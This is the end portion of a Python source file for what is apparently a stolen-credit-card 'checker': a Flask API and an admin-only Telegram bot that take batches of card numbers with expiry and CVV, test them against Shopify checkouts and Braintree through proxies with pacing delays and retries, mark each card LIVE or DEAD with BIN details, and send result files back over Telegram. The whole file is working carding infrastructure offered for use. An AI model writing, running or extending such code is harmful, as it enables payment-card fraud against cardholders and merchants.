@app.route('/health')
def health(): return jsonify({"ok":True})

@app.route('/shopi')
def shopi():
    try:
        site=request.args.get('site'); ccs=request.args.get('cc')
        if not site: return jsonify({"error":"Missing site","status":False}),400
        if not ccs: return jsonify({"error":"Missing cc","status":False}),400
        p=parse_cc(ccs); vid=request.args.get('variant')
        loop=asyncio.new_event_loop(); asyncio.set_event_loop(loop)
        try: succ,msg,gw,prc,cur=loop.run_until_complete(process_card(p['cc'],p['mes'],p['ano'],p['cvv'],site,vid))
        finally: loop.close()
        return jsonify({"Gateway":gw,"Price":float(prc) if prc.replace('.','',1).isdigit() else 0.0,
                        "Response":clean_r(msg),"Status":succ,"cc":ccs,"Bin":bin_dict(p['cc'])})
    except Exception as e: return jsonify({"error":str(e),"status":False}),500

@app.route('/bt')
def bt_route():
    ccs=request.args.get('cc')
    if not ccs: return jsonify({"error":"Missing cc","status":False}),400
    p=parse_cc(ccs)
    succ,msg,gw,prc,cur=bt_check(p['cc'],p['mes'],p['ano'],p['cvv'])
    return jsonify({"Gateway":gw,"Price":float(prc),"Response":clean_r(msg),"Status":succ,"cc":ccs,"Bin":bin_dict(p['cc'])})

# ---------- Telegram ----------
TG_TOKEN=""; TG_ADMIN=0; TG_POLL=30
_off=0
_st={"q":0,"p":0,"f":0,"r":0,"live":0,"dead":0}
_slk=threading.Lock()
_batch_lock=threading.Lock()
_batch_seq=0
_batches=OrderedDict()

_lanes=[_q.Queue() for _ in range(TG_W)]
_lane_rr={"i":0}
_lane_rr_lock=threading.Lock()

def _esc(s):
    return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;") if s is not None else ""

def _tg(method,params):
    try:
        r=requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/{method}",json=params,timeout=TG_POLL+10)
        return r.json()
    except Exception as e:
        print(f"{C.D}[TG] {method}: {e}{C.R}"); return None

def _send(cid,txt,rt=None,pm=None):
    p={"chat_id":cid,"text":txt,"disable_web_page_preview":True}
    if rt: p["reply_to_message_id"]=rt
    if pm: p["parse_mode"]=pm
    time.sleep(TG_SEND_DELAY)
    return _tg("sendMessage",p)

def _send_file(cid,path,caption=None,rt=None):
    try:
        with open(path,"rb") as f:
            files={"document":f}
            data={"chat_id":cid,"caption":caption or ""}
            if rt: data["reply_to_message_id"]=rt
            r=requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument",
                            data=data,files=files,timeout=120)
            return r.json()
    except Exception as e:
        print(f"{C.D}[TG] sendDocument: {e}{C.R}"); return None

def _help():
    return ("<b>🔥 Checker Bot</b>\n\n"
            "▸ <code>/check cc</code> or <code>/check cc site</code> — Shopify\n"
            "▸ <code>/bt cc</code> — Braintree\n"
            "▸ multi-line / comma separated supported\n"
            "▸ <code>/queue</code> · <code>/status</code> · <code>/help</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/bt 4111111111111111|12|2030|123</code>\n"
            "<code>5555555555554444|01|2031|456</code>")

def _status():
    with _slk:
        return (f"<b>📊 Status</b>\n▸ Workers: <b>{TG_W}</b>\n▸ Queued: <b>{_st['q']}</b>\n"
                f"▸ Running: <b>{_st['r']}</b>\n▸ Done: <b>{_st['p']}</b>\n"
                f"▸ Failed: <b>{_st['f']}</b>\n▸ Live: <b>{_st['live']}</b>\n"
                f"▸ Dead: <b>{_st['dead']}</b>\n▸ Proxies: <b>{len(WORKING)}</b>\n"
                f"▸ Active batches: <b>{len(_batches)}</b>")

def _result_block(rows):
    out=[]
    for r in rows:
        out.append(
            f"{r['icon']} <b>{_esc(r['resp'])}</b>\n"
            f"▸ Card: <code>{_esc(r['cc'])}</code>\n"
            f"▸ GW: {_esc(r['gw'])}\n"
            f"▸ Price: {_esc(r['price'])} {_esc(r['cur'])}\n"
            f"▸ Time: {r['el']:.1f}s\n"
            f"━━━━━━━━━━━━━━━\n"
            f"▸ BIN: {_esc(r['bin'])}"
        )
    return "\n\n".join(out)

def _batch_summary(b):
    n_live = sum(1 for d in b["done"] if d["succ"])
    n_dead = len(b["done"]) - n_live
    lines = [
        f"🏁 <b>Batch #{b['bid']} complete</b>",
        f"▸ Total: <b>{b['total']}</b>",
        f"▸ Live: <b>{n_live}</b>",
        f"▸ Dead: <b>{n_dead}</b>",
    ]
    if b.get("invalid"):
        lines.append(f"▸ Invalid skipped: <b>{len(b['invalid'])}</b>")
    return "\n".join(lines)

def _dump_batch_file(b):
    path=os.path.join(RESULT_DIR,f"batch_{b['bid']}_{int(time.time())}.txt")
    with open(path,"w") as f:
        f.write(f"Batch #{b['bid']}  mode={b['mode']}  total={b['total']}\n")
        f.write(f"site={b.get('site') or '-'}\n")
        if b.get("invalid"):
            f.write(f"invalid_skipped={len(b['invalid'])}\n")
            for l in b["invalid"]:
                f.write(f"  INVALID: {l}\n")
        f.write("="*60+"\n")
        for d in b["done"]:
            f.write(
                f"{d['idx']:>4}. [{'LIVE' if d['succ'] else 'DEAD'}] "
                f"{d['cc']} | {d['resp']} | {d['gw']} | {d['price']} {d['cur']} | {d['el']:.1f}s\n"
            )
    return path

def _worker(wid, lane):
    while True:
        try:
            it=_lanes[lane].get()
        except Exception:
            time.sleep(0.5); continue
        if it is None:
            _lanes[lane].task_done(); continue

        if len(it)==6:
            mode,cid,mid,site,ccs,px=it; bid=None; idx=None
        else:
            mode,cid,mid,site,ccs,px,bid,idx=it

        with _slk: _st["r"]+=1
        try:
            time.sleep(CARD_DELAY) # <-- ဒီနေရာမှာ ၂ စက္ကန့် စောင့်မယ်
            p=parse_cc(ccs); t0=time.time()
            if mode=="bt":
                succ,msg,gw,prc,cur=bt_check(p['cc'],p['mes'],p['ano'],p['cvv'])
            else:
                loop=asyncio.new_event_loop(); asyncio.set_event_loop(loop)
                try: succ,msg,gw,prc,cur=loop.run_until_complete(
                        process_card(p['cc'],p['mes'],p['ano'],p['cvv'],site,None))
                finally: loop.close()
            el=time.time()-t0; cl=clean_r(msg)

            row={"icon":"✅" if succ else "❌","resp":cl,"cc":ccs,"gw":gw,
                 "price":prc,"cur":cur,"el":el,"bin":bin_line(p['cc']),
                 "succ":succ,"idx":idx}

            # ERROR DETECT -> RETRY
            is_error = any(err in cl.upper() for err in ["LOOKUP ERROR", "NO SESSION", "BAD JSON", "REQ FAILED", "PROXY", "TIMEOUT", "ERROR"])
            
            rows_to_send=[]; prog=False; finished=False; done_n=0; total=0; retries=[]

            if is_error and bid is not None:
                with _batch_lock:
                    b=_batches.get(bid)
                    if b:
                        b["retry_queue"].append((mode,cid,mid,site,ccs,None,bid,idx))
                        row = None 
            else:
                with _slk:
                    _st["p"]+=1
                    if succ: _st["live"]+=1
                    else:    _st["dead"]+=1

            if row is not None:
                with _batch_lock:
                    b=_batches.get(bid) if bid is not None else None
                    if b:
                        b["done"].append(row)
                        b["pending_rows"].append(row)
                        done_n=len(b["done"]); total=b["total"]
                        flush = len(b["pending_rows"])>=MSG_PER_BATCH
                        prog  = (done_n % PROGRESS_EVERY==0 and done_n<total)
                        finished = (done_n==total)
                        if flush:
                            rows_to_send=list(b["pending_rows"])
                            b["pending_rows"].clear()

            if rows_to_send:
                _send(cid,_result_block(rows_to_send),rt=mid,pm="HTML")
            if prog:
                _send(cid,f"⏳ <b>Batch #{bid}</b> · {done_n}/{total} done",rt=mid,pm="HTML")
                
            if finished:
                with _batch_lock:
                    b=_batches.get(bid)
                    if b and b.get("retry_queue"):
                        retries = list(b["retry_queue"])
                        b["retry_queue"].clear()
                        finished = False
                    else:
                        b=_batches.pop(bid,None)
                
                if finished and b:
                    if b["pending_rows"]:
                        _send(cid,_result_block(b["pending_rows"]),rt=mid,pm="HTML")
                    _send(cid,_batch_summary(b),rt=mid,pm="HTML")
                    try:
                        path=_dump_batch_file(b)
                        _send_file(cid,path, caption=f"batch #{b['bid']} results · {len(b['done'])} cards", rt=mid)
                    except Exception as e:
                        print(f"{C.D}[TG] dump: {e}{C.R}")
                        
            for r_item in retries:
                _lanes[lane].put(r_item)
                with _slk: _st["q"]+=1

        except Exception as e:
            with _slk: _st["f"]+=1
            try: _send(cid,f"⚠️ {_esc(e)}",rt=mid,pm="HTML")
            except: pass
        finally:
            with _slk: _st["r"]-=1
            try: _lanes[lane].task_done()
            except: pass

def _pick_lane():
    with _lane_rr_lock:
        i=_lane_rr["i"]%TG_W
        _lane_rr["i"]+=1
        return i

def _enqueue_batch(mode,cid,mid,site,ccs_list,invalid):
    global _batch_seq
    if not ccs_list:
        _send(cid,"❌ no valid cards",rt=mid,pm="HTML"); return
    if len(ccs_list)>BATCH_MAX:
        _send(cid,f"❌ too many cards (max {BATCH_MAX})",rt=mid,pm="HTML"); return
    lane=_pick_lane()
    with _batch_lock:
        _batch_seq+=1
        bid=_batch_seq
        _batches[bid]={"bid":bid,"cid":cid,"mid":mid,"mode":mode,"site":site,
                       "cards":list(ccs_list),"done":[],"pending_rows":[],
                       "invalid":list(invalid),"total":len(ccs_list),
                       "lane":lane, "retry_queue": []}
    hdr=(f"📥 <b>Batch #{bid}</b> · {len(ccs_list)} card(s) queued · lane {lane+1}"
         + (f"\n⚠️ {len(invalid)} invalid skipped" if invalid else ""))
    _send(cid,hdr,rt=mid,pm="HTML")
    for i,ccs in enumerate(ccs_list,1):
        _lanes[lane].put((mode,cid,mid,site,ccs,None,bid,i))
        with _slk: _st["q"]+=1

def _handle(u):
    m=u.get("message") or u.get("edited_message")
    if not m: return
    cid=(m.get("chat") or {}).get("id")
    if cid!=TG_ADMIN:
        if cid:
            try: _send(cid,"⛔ Unauthorized")
            except: pass
        return
    txt=(m.get("text") or "").strip(); mid=m.get("message_id")
    if not txt: return
    if txt in ("/start","/help"):
        _send(cid,_help(),rt=mid,pm="HTML"); return
    if txt in ("/queue","/status"):
        _send(cid,_status(),rt=mid,pm="HTML"); return

    if txt.startswith("/bt"):
        raw=txt[3:].strip()
        if not raw:
            _send(cid,"❌ <code>/bt CC|MM|YYYY|CVV</code>",rt=mid,pm="HTML"); return
        good,bad=parse_batch(raw)
        _enqueue_batch("bt",cid,mid,"",good,bad)
        return

    if txt.startswith("/check"):
        raw=txt[6:].strip()
        if not raw:
            _send(cid,"❌ <code>/check CC|MM|YYYY|CVV [site]</code>",rt=mid,pm="HTML"); return
        site=DEFAULT_CART_URL
        first_line=raw.split("\n",1)[0].strip()
        parts=first_line.split()
        if len(parts)>=2 and parts[-1].startswith("http"):
            site=parts[-1]
            raw="\n".join([" ".join(parts[:-1])]+raw.split("\n")[1:])
        good,bad=parse_batch(raw)
        _enqueue_batch("shopify",cid,mid,site,good,bad)
        return

def _poll():
    global _off
    print(f"{C.D}[TG] poll started{C.R}")
    while True:
        try:
            r=_tg("getUpdates",{"offset":_off,"timeout":TG_POLL,"allowed_updates":["message","edited_message"]})
            if not r or not r.get("ok"): time.sleep(3); continue
            for u in r.get("result",[]):
                _off=u["update_id"]+1
                try: _handle(u)
                except Exception as e: print(f"{C.D}[TG] {e}{C.R}")
        except Exception as e: print(f"{C.D}[TG] poll: {e}{C.R}"); time.sleep(5)

# ---------- Startup ----------
DEFAULT_CART_URL="https://chewy-pawz.myshopify.com/cart/40234703421575:1"

def ask_creds():
    global TG_TOKEN,TG_ADMIN
    print(f"{C.CYN}{C.B}◆ Setup{C.R}  {C.D}(Telegram credentials){C.R}\n")
    while not TG_TOKEN:
        TG_TOKEN=input(f"  {C.GOLD}▸ Bot Token:{C.R} ").strip()
        if not TG_TOKEN: print(f"  {C.RED}✗ required{C.R}")
    while not TG_ADMIN:
        try: TG_ADMIN=int(input(f"  {C.GOLD}▸ Admin ID:{C.R} ").strip())
        except ValueError: print(f"  {C.RED}✗ numeric only{C.R}")
    print()

def tg_start():
    _tg("deleteWebhook",{"drop_pending_updates":False})
    me=_tg("getMe",{})
    if me and me.get("ok"):
        print(f"  {C.LIME}✓{C.R} Bot: {C.B}@{me['result']['username']}{C.R}")
    for i in range(TG_W):
        threading.Thread(target=_worker,args=(i+1, i),daemon=True).start()
    threading.Thread(target=_poll,daemon=True).start()
    print(f"  {C.LIME}✓{C.R} Workers: {C.B}{TG_W}{C.R} (lanes 1..{TG_W})")
    print(f"  {C.LIME}✓{C.R} Admin: {C.B}{TG_ADMIN}{C.R}\n")

if __name__=="__main__":
    os.system("clear" if os.name!="nt" else "cls")
    banner()
    ask_creds()
    validate_proxies()
    print(f"{C.CYN}{C.B}◆ Starting Services{C.R}\n")
    tg_start()
    print(f"{C.LIME}{C.B}  ⚡ Bot is live  ⚡{C.R}")
    print(f"{C.D}  Flask: http://0.0.0.0:8000{C.R}\n")
    app.run(host="0.0.0.0",port=8000,debug=False)